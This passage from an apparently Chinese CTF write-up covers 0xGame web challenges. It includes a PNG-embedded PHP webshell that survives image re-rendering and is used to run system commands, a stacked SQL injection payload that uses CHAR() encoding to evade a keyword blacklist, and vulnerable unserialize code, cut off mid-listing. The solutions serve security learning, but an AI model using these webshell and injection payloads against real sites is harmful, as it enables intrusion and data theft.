invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<span class="hljs-comment">//åŒä¸Š</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/png&quot;</span>:<br>        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<span class="hljs-comment">//åŒä¸Š</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type!&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION); <span class="hljs-comment">//è·å¾—æ–‡ä»¶åç¼€ï¼Œå½“å‡ºç°å¤šä¸ª . æ—¶ï¼Œç»“æœä¸ºæœ€åä¸€ä¸ª . åé¢çš„å†…å®¹ã€‚</span><br><span class="hljs-variable">$filepath</span> = <span class="hljs-variable">$user_dir</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$ext</span>; <span class="hljs-comment">//å°†æ–‡ä»¶åŸå§‹åmd5åŠ å¯†åå’Œuser_diræ‹¼æ¥ï¼Œåé¢åŠ ä¸ª.åç¼€ã€‚è¿™ä¸œè¥¿ä½œä¸ºæ–‡ä»¶çš„å­˜å‚¨è·¯å¾„</span><br><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]) &#123; <span class="hljs-comment">//å†æ¬¡æ£€éªŒæ–‡ä»¶ç±»å‹</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/gif&quot;</span>:<br>        <span class="hljs-title function_ invoke__">imagegif</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<span class="hljs-comment">//å°†$sourceä¿å­˜åˆ°$filepathä¸­ï¼Œ</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/jpeg&quot;</span>: <span class="hljs-comment">//åŒä¸Š</span><br>        <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/png&quot;</span>:<span class="hljs-comment">//åŒä¸Š</span><br>        <span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Upload avatar success! Path: &#x27;</span>.<span class="hljs-variable">$filepath</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å»ç½‘ä¸ŠæŸ¥äº†æœ‰å…³äºŒæ¬¡æ¸²æŸ“ç»•è¿‡çš„èµ„æ–™ï¼Œå‘ç°æœ‰äº›é¢˜ç›®æ˜¯äºŒæ¬¡æ¸²æŸ“é…åˆ<code>include</code>å‡½æ•°å†ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œä½†è¿™é¢˜æ²¡ç»™<code>include</code>å‡½æ•°ï¼Ÿæ ¹æ®å¸ˆå‚…çš„æç¤ºæœç´¢äº†ç”Ÿæˆç”¨äºç»•è¿‡äºŒæ¬¡æ¸²æŸ“çš„è„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><br><br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   <span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ”¾æœ¬åœ°è¿è¡Œä¸€ä¸‹ï¼Œç”Ÿæˆ<code>1.png</code>ï¼Œæ”¾åˆ°HexCmpä¸‹çœ‹çœ‹ï¼š</p><p><img src="/img/ul1.png" alt="ul1"></p><p>æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><code>&lt;?=$_GET[0]($_POST[1]);?&gt;//GET0ä¼ å‡½æ•°åï¼ŒPOST1ä¼ å‚æ•°</code></p><p>å…ˆåç¼€æ”¹æˆ<code>php</code>ï¼Œä¸Šä¼ æ—¶æŠ“åŒ…æŠŠcontent-typeå­—æ®µæ”¹æˆ<code>image/png</code>ï¼Œå‘ç°ä¸Šä¼ æˆåŠŸï¼Œè®¿é—®URLï¼š</p><p><img src="/img/ul2.png" alt="ul2"></p><p>æˆåŠŸï¼Œ<code>GET</code>ä¼ å‚<code>0=system</code>ï¼Œ<code>POST</code>ä¼ å‚<code>1=ls;</code>ï¼Œå…ˆçœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š</p><p><img src="/img/ul3.png" alt="ul3"></p><p><code>GET</code>ä¼ å‚<code>0=system</code>ï¼Œ<code>POST</code>ä¼ å‚<code>1=ls /;</code>ï¼Œçœ‹æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š</p><p><img src="/img/ul4.png" alt="ul4"></p><p><code>GET</code>ä¼ å‚<code>0=system</code>ï¼Œ<code>POST</code>ä¼ å‚<code>1=cat /flag;</code>ï¼Œå¾—åˆ°<code>flag</code>:</p><p><code>0xGame&#123;4611f622-8577-4ac4-8f85-0b787730800c&#125;</code></p><h3 id="Week-2-ez-sqli"><a href="#Week-2-ez-sqli" class="headerlink" title="[Week 2] ez_sqli"></a>[Week 2] ez_sqli</h3><p><code>url:http://120.27.148.152:50021/?order=email</code>ï¼Œå¸ˆå‚…æç¤ºæ˜¯å †å æ³¨å…¥ï¼Œè€Œä¸”ç›´æ¥<code>select flag from flag</code>å°±èƒ½æ‹¿ç­”æ¡ˆã€‚</p><p>ç»™äº†é™„ä»¶ï¼Œçœ‹ä¸‹æºç é‡Œé»‘åå•éƒ½æœ‰å•¥ï¼š</p><p><code>blacklist = [&#39;select&#39;, &#39;update&#39;, &#39;insert&#39;, &#39;delete&#39;, &#39;database&#39;, &#39;table&#39;, &#39;column&#39;, &#39;alter&#39;, &#39;create&#39;, &#39;drop&#39;, &#39;and&#39;, &#39;or&#39;, &#39;xor&#39;, &#39;if&#39;, &#39;else&#39;, &#39;then&#39;, &#39;where&#39;]</code></p><p><code>?order=id;show tables</code>è¿™ç§æ²¡æ³•ç”¨äº†ï¼Œæ ¹æ®å¸ˆå‚…æç¤ºå¯ä»¥ä½¿ç”¨<code>prepare</code>å’Œ<code>execute</code>ç»“åˆæ‰§è¡Œï¼Œæœ‰ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SET</span> <span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>));<br><span class="hljs-keyword">PREPARE</span> hello <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@a</span>;<br><span class="hljs-keyword">EXECUTE</span> hello;#<br></code></pre></td></tr></table></figure><p>ä½†selectè¢«è¿‡æ»¤æ‰äº†ï¼Œç©ºæ ¼å¥½åƒä¹Ÿä¸èƒ½ç›´æ¥ç”¨ï¼Ÿå€ŸåŠ©<code>char()</code>å‡½æ•°ç›´æ¥æŠŠç¬¬ä¸€æ®µå…¨è½¬æˆå­—ç¬¦ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">101</span>,<span class="hljs-number">120</span>,<span class="hljs-number">116</span>,<span class="hljs-number">114</span>,<span class="hljs-number">97</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">118</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">117</span>,<span class="hljs-number">101</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">44</span>,<span class="hljs-number">99</span>,<span class="hljs-number">111</span>,<span class="hljs-number">110</span>,<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">48</span>,<span class="hljs-number">120</span>,<span class="hljs-number">55</span>,<span class="hljs-number">101</span>,<span class="hljs-number">44</span>,<span class="hljs-number">40</span>,<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,<span class="hljs-number">109</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">32</span>,<span class="hljs-number">108</span>,<span class="hljs-number">105</span>,<span class="hljs-number">109</span>,<span class="hljs-number">105</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">48</span>,<span class="hljs-number">44</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">59</span>);<br><span class="hljs-keyword">PREPARE</span> hello <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@a</span>;<br><span class="hljs-keyword">EXECUTE</span> hello;#<br><br></code></pre></td></tr></table></figure><p><code>SET @a=CHAR(115,101,108,101,99,116,32,101,120,116,114,97,99,116,118,97,108,117,101,40,49,44,99,111,110,99,97,116,40,48,120,55,101,44,40,115,101,108,101,99,116,32,102,108,97,103,32,102,114,111,109,32,102,108,97,103,32,108,105,109,105,116,32,48,44,49,41,41,41,59);PREPARE/**/hello/**/FROM/**/@a;EXECUTE/**/hello;</code></p><p><img src="/img/sqli1.png" alt="sqli1"></p><p>è¿”å›ï¼š<code>XPATH syntax error: &#39;~0xGame&#123;4286b62d-c37e-4010-ba9c-&#39;&quot;)</code>,æ²¡æ˜¾ç¤ºå®Œå…¨ï¼Œå¥½åƒå› ä¸ºæŠ¥é”™å‡½æ•°åªèƒ½æ˜¾ç¤º32ä½ï¼Ÿæ”¹ä¸‹<code>payload</code>è®©å®ƒæ˜¾ç¤º<code>flag</code>çš„å30ä½ï¼š<code>flag</code>-&gt;<code>(right(flag,30))</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?<span class="hljs-keyword">order</span><span class="hljs-operator">=</span>email;<span class="hljs-keyword">SET</span> <span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">101</span>,<span class="hljs-number">120</span>,<span class="hljs-number">116</span>,<span class="hljs-number">114</span>,<span class="hljs-number">97</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">118</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">117</span>,<span class="hljs-number">101</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">44</span>,<span class="hljs-number">99</span>,<span class="hljs-number">111</span>,<span class="hljs-number">110</span>,<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">48</span>,<span class="hljs-number">120</span>,<span class="hljs-number">55</span>,<span class="hljs-number">101</span>,<span class="hljs-number">44</span>,<span class="hljs-number">40</span>,<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">40</span>,<span class="hljs-number">114</span>,<span class="hljs-number">105</span>,<span class="hljs-number">103</span>,<span class="hljs-number">104</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">44</span>,<span class="hljs-number">51</span>,<span class="hljs-number">48</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,<span class="hljs-number">109</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">32</span>,<span class="hljs-number">108</span>,<span class="hljs-number">105</span>,<span class="hljs-number">109</span>,<span class="hljs-number">105</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">48</span>,<span class="hljs-number">44</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">59</span>);<span class="hljs-keyword">PREPARE</span><span class="hljs-comment">/**/</span>hello<span class="hljs-comment">/**/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span>;<span class="hljs-keyword">EXECUTE</span><span class="hljs-comment">/**/</span>hello;<br></code></pre></td></tr></table></figure><p><img src="/img/sqli2.png" alt="sqli2"></p><p>æ‹¼èµ·æ¥å¾—åˆ°<code>flag</code>:<code>0xGame&#123;4286b62d-c37e-4010-ba9c-35d47641fb91&#125;</code></p><h3 id="Week-2-ez-unserialize"><a href="#Week-2-ez-unserialize" class="headerlink" title="[Week 2] ez_unserialize"></a>[Week 2] ez_unserialize</h3><p>è¿™é¢˜æ²¡åšå‡ºæ¥æŒºå¯æƒœçš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cache</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$expired</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$helper</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$helper</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;value = <span class="hljs-variable">$value</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;helper = <span class="hljs-variable">$helper</span>;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;expired = False;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">//å¼ºè¡ŒæŠŠexpiredè®¾ç½®Falseï¼Œä¹‹å‰ç¢°åˆ°éƒ½æ˜¯åˆ©ç”¨ä¿®æ”¹å±æ€§ä¸ªæ•°ç»•è¿‡ï¼Œä½†å¸ˆå‚…æç¤ºéœ€é€šè¿‡å¼•ç”¨ç»•è¿‡</span><br>        <span class="hljs-variable language_">$this</span>-&gt;expired = False;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">expired</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;expired) &#123; <span class="hljs-comment">//å¦‚æœexpiredä¸ºTrue</span><br>            <span class="hljs-variable language_">$this</span>-&gt;helper-&gt;<span class="hljs-title function_ invoke__">clean</span>(<span class="hljs-variable">$this</span>-&gt;key);<span class="hljs-comment">//clean?å¥½åƒæ˜¯ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œé€šè¿‡è¿™ä¸ªè°ƒç”¨__call</span><br>            <span class="hljs-keyword">return</span> True; <span class="hljs-comment">//è¿”å›True</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Storage</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$store</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-keyword">array</span>();<span class="hljs-comment">//å°†ä¸€ä¸ªç©ºæ•°ç»„èµ‹å€¼ç»™store</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;<span class="hljs-comment">//ç»™ä¸å¯è®¿é—®å±æ€§èµ‹å€¼æ—¶è¢«è°ƒç”¨</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;store) <br>            <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-keyword">array</span>();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$value</span>-&gt;<span class="hljs-title function_ invoke__">expired</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;store[<span class="hljs-variable">$name</span>] = <span class="hljs-variable">$value</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcs</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;funcs = <span class="hljs-variable">$funcs</span>;<span class="hljs-comment">//systemå‡½æ•°</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$args</span></span>) </span>&#123; <span class="hljs-comment">//é“¾å­çš„å°¾ï¼Œé€šè¿‡è¿™ä¸ªæ‰§è¡Œå‘½ä»¤</span><br>        <span class="hljs-variable language_">$this</span>-&gt;funcs[<span class="hljs-variable">$name</span>](...<span class="hljs-variable">$args</span>);  <span class="hljs-comment">//system(&#x27;ls&#x27;)ç­‰ï¼Ÿ</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataObject</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$storage</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-comment">//é“¾å­çš„å¤´</span><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;data <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<span class="hljs-comment">//éå†dataæ•°ç»„ï¼Œé”®keyå€¼value</span><br>            <span class="hljs-variable language_">$this</span>-&gt;storage-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<span class="hljs-comment">//å°†storageå¯¹è±¡çš„$keyå±æ€§èµ‹å€¼ä¸º$value,æ³¨æ„æ­¤æ—¶å¯ä»¥å»è§¦å‘Storageçš„__setæ–¹æ³•.(ç»™ä¸å¯è®¿é—®çš„å±æ€§èµ‹å€¼)</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]);<span class="hljs-comment">//ååºåˆ—åŒ–</span><br>&#125;<br><span class="hljs-meta">?&gt;</span> <br>    <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 